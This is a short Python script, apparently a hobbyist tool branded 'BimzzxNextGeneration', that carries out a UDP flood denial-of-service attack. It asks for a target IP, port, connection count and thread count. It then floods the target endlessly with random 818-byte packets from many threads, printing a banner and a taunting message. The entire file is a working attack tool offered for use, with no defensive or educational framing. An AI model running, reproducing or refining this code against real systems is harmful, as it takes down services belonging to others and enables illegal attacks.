import os
import sys
import time
import socket
import random
import threading

# Clear
def clear():
	os.system('cls' if os.name=='nt' else 'clear')

# Launch DDoS
clear()
ip = str(input("\033[91m[ ✿ ] IP >>"))
port = int(input("\033[91m[ ✿ ] PORT >> "))
times = int(input("\033[91m[ ✿ ] CONNECTIONS >>"))
threads = int(input("\033[91m[ ✿ ] THREADS >>"))

def attack():
	print("""
\033[91m╔════════════════════════════════════════╗
\033[91m║ \033[33m┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋╋╋┏┳━━━┓╋╋╋╋╋┏┓   \033[91m ║
\033[91m║ \033[33m┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃╋╋╋╋╋╋┃┃┏━┓┃╋╋╋╋┏┛┗┓ \033[91m║
\033[91m║ \033[33m┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┳━━┳━┛┃┗━━┳━━┳━╋┓┏┛ \033[91m║
\033[91m║ \033[33m┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┫┃━┫┏┓┣━━┓┃┃━┫┏┓┫┃   \033[91m ║
\033[91m║ \033[33m┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┫┃━┫┗┛┃┗━┛┃┃━┫┃┃┃┗┓ \033[91m║
\033[91m║ \033[33m┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┻━━┻━━┻━━━┻━━┻┛┗┻━┛ \033[91m║
\033[91m╚════════════════════════════════════════╝
\033[91m╔══════════════════╦════════════════════╗
\033[91m║ BimzzxNextGeneration.        ║ Tools Build At 15/5/2022.         ║
\033[91m╚══════════════════╩════════════════════╝
\033[91m[ # ] ATTACKED TO IP \033[33m{}\033[91m AND PORT \033[33m{}\033[0m""".format(ip, port))

def ddos():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
				s.sendto(data,addr)
			attack()
		except:
			print("[ # ] Down Kah Dek?? Sksksks...")

for y in range(threads):
    th = threading.Thread(target = ddos)
    th.start()